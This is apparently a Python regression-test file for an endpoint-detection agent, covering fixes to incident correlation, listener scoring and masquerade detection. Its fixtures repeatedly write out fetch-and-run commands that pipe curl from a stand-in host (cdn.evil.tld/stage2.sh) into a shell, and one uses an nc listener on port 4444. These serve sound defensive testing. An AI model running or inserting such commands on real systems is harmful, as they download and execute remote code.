#!/usr/bin/env python3
"""Regression tests for the 2026-10-22 investigation-storm fixes.

A long-running agent began minting hundreds of investigations an hour with no single cause visible
across them. The root cause was threefold, and all three are pinned here so the storm cannot return:

  1. The correlator re-identified an incident by its member node ids, which are ephemeral by
     construction -- `proc:<pid>` dies with each exec and `listen:<pid>:<proto>:<addr>:<port>`
     carries a port that rotates every snapshot. A recurring cluster therefore shared zero members
     between snapshots and reconcile() minted a brand-new investigation every ~3s cycle. Identity
     now comes from the correlation KEYS that tie the cluster (root process / hash / IP / URL / run
     payload / path), which are stable across snapshots.
  2. A 0.0.0.0 listener on an ephemeral/dynamic port (>=49152) scored a full 40-pt network-reachable
     alert, so daemons rebinding dynamic ports (NordVPN's Shield extension, Chrome helpers) produced
     an endless stream of them. Such a bind is now informational (weight 0).
  3. argv[0] != executable fired T1036 masquerade on validly-signed vendor binaries that legitimately
     set their own argv[0] (GoogleUpdater, Electron/Chrome helpers, multi-call tool launchers). It is
     now only a signal on binaries that are not apple/developer-id signed.

Pure stdlib, like the agent. Run from the repo root:

    python3 -m unittest discover -s tests -v
"""
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import agent  # noqa: E402


def exec_alert(nid, cmdline, severity="high", mitre=("T1059.004",)):
    """A short-lived exec alert: already exited, no hash/addr/path, only what it ran. This is the
    shape whose node id turns over every snapshot."""
    return {"id": nid, "type": "process", "label": "x", "severity": severity, "score": 70,
            "reasons": [{"text": "t", "mitre": m} for m in mitre],
            "detail": {"cmdline": cmdline, "exe": "/bin/zsh", "hashes": {"status": "n/a"},
                       "signature": {"category": "apple", "trusted": True}},
            "triage": {"status": "open"}}


def clusters_of(nodes, proc_parent=None):
    return agent.correlate_incidents(nodes, {n["id"]: n for n in nodes}, [], proc_parent or {})


class TestStableIncidentIdentity(unittest.TestCase):
    """Fix 1 at the correlate layer: the stable sig."""

    def test_same_tie_different_member_ids_share_one_sig(self):
        url = "http://cdn.evil.tld/stage2.sh"
        s1 = clusters_of([exec_alert("exec:%d:1" % i, "/bin/zsh -c curl -fsSL %s | sh" % url)
                          for i in (1, 2, 3)])
        s2 = clusters_of([exec_alert("exec:%d:1" % i, "/bin/zsh -c curl -fsSL %s | sh" % url)
                          for i in (7, 8, 9)])
        self.assertEqual(len(s1), 1)
        self.assertEqual(len(s2), 1)
        self.assertEqual(s1[0]["sig"], s2[0]["sig"])               # identity is the tie, not the ids
        self.assertNotEqual(set(s1[0]["members"]), set(s2[0]["members"]))   # and the ids really differ

    def test_a_stable_process_root_anchors_the_sig(self):
        """Even with every member id new, two snapshots of the same process tree (same root pid, as a
        long-lived daemon keeps) carry the same sig."""
        def tree(ids):
            nodes = [agent_alert("proc:%d" % i, pid=i, exe="/usr/sbin/daemon",
                                 cmdline="daemon --w %d" % i) for i in ids]
            return nodes
        pp = {10: 1, 11: 10, 12: 10, 20: 1, 21: 20, 22: 20}
        s1 = clusters_of(tree((10, 11, 12)), proc_parent={10: 1, 11: 10, 12: 10})
        # a later snapshot: same daemon root (pid 10 still alive), children re-spawned with new pids
        nodes2 = [agent_alert("proc:10", pid=10, exe="/usr/sbin/daemon", cmdline="daemon --w 10"),
                  agent_alert("proc:31", pid=31, exe="/usr/sbin/daemon", cmdline="daemon --w 31"),
                  agent_alert("proc:32", pid=32, exe="/usr/sbin/daemon", cmdline="daemon --w 32")]
        s2 = clusters_of(nodes2, proc_parent={10: 1, 31: 10, 32: 10})
        self.assertEqual(s1[0]["sig"], s2[0]["sig"])
        del pp

    def test_distinct_clusters_get_distinct_sigs(self):
        a = clusters_of([exec_alert("exec:%d:1" % i, "/bin/zsh -c curl http://a.tld/x | sh")
                         for i in (1, 2)])
        b = clusters_of([exec_alert("exec:%d:1" % i, "/bin/zsh -c curl http://b.tld/x | sh")
                         for i in (1, 2)])
        self.assertNotEqual(a[0]["sig"], b[0]["sig"])


def agent_alert(nid, pid, exe, cmdline, severity="high", mitre=("T1059",)):
    return {"id": nid, "type": "process", "label": os.path.basename(exe), "severity": severity,
            "score": 70, "reasons": [{"text": "t", "mitre": m} for m in mitre],
            "detail": {"pid": pid, "exe": exe, "cmdline": cmdline}, "triage": {"status": "open"}}


class TestReconcileDoesNotMultiply(unittest.TestCase):
    """Fix 1 end-to-end: the same logical cluster across snapshots stays ONE investigation."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="scouter-storm-")
        self.store = agent.IncidentStore(path=os.path.join(self.tmp, "incidents.json"))

    def _snapshot(self, ids):
        url = "http://cdn.evil.tld/stage2.sh"
        nodes = [exec_alert("exec:%d:1" % i, "/bin/zsh -c curl -fsSL %s | sh" % url) for i in ids]
        clusters = [c for c in clusters_of(nodes) if c["size"] >= 2]
        self.store.reconcile(clusters)

    def test_churning_member_ids_stay_one_investigation(self):
        self._snapshot((1, 2, 3))
        self._snapshot((4, 5, 6))          # same tie, all-new exec ids (the pids rolled over)
        self._snapshot((7, 8, 9))
        self.assertEqual(len(self.store.list()), 1)

    def test_a_closed_churning_cluster_stays_closed(self):
        """Closing the investigation must actually stick: the next snapshot of the same churning
        cluster must land back on the (closed) incident, not mint a fresh open one."""
        self._snapshot((1, 2, 3))
        iid = self.store.list()[0]["id"]
        self.store.set_status(iid, "closed", substatus="Benign")
        self._snapshot((4, 5, 6))
        lst = self.store.list()
        self.assertEqual(len(lst), 1)
        self.assertEqual(lst[0]["status"], "closed")


class TestEphemeralListenerNotAnAlert(unittest.TestCase):
    """Fix 2: a dynamic-port 0.0.0.0 bind is informational, a real service port still alerts."""

    def test_dynamic_port_listener_scores_zero(self):
        sc, reasons, kind = agent.score_connection(
            {"state": "LISTEN", "laddr": "*", "lport": "59876", "proto": "TCP"},
            "com.nordvpn.macos.Shield")
        self.assertEqual(kind, "listen")
        self.assertEqual(sc, 0)
        self.assertTrue(any("ephemeral" in r["text"] for r in reasons))

    def test_service_port_listener_still_alerts(self):
        sc, reasons, _ = agent.score_connection(
            {"state": "LISTEN", "laddr": "0.0.0.0", "lport": "4444", "proto": "TCP"}, "nc")
        self.assertEqual(sc, 40)
        self.assertTrue(any("reachable from the network" in r["text"] for r in reasons))

    def test_loopback_listener_unaffected(self):
        sc, reasons, _ = agent.score_connection(
            {"state": "LISTEN", "laddr": "127.0.0.1", "lport": "59876", "proto": "TCP"}, "x")
        self.assertEqual(sc, 0)
        self.assertTrue(any("loopback" in r["text"] for r in reasons))


class TestSignedBinaryMasqueradeSuppressed(unittest.TestCase):
    """Fix 3: argv[0] != exe only signals on binaries that are not validly signed."""

    def _masq_reasons(self, cat):
        p = {"exe": "/Applications/Google Chrome.app/Contents/Frameworks/GoogleUpdater",
             "cmdline": "Application --check"}
        _, reasons = agent.score_process(p, {"category": cat, "trusted": cat in ("apple", "developer-id")},
                                         [], [])
        return [r for r in reasons if "differs from executable" in r["text"]]

    def test_developer_id_binary_is_not_flagged(self):
        self.assertEqual(self._masq_reasons("developer-id"), [])

    def test_apple_binary_is_not_flagged(self):
        self.assertEqual(self._masq_reasons("apple"), [])

    def test_unsigned_binary_still_flagged(self):
        self.assertTrue(self._masq_reasons("unsigned"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
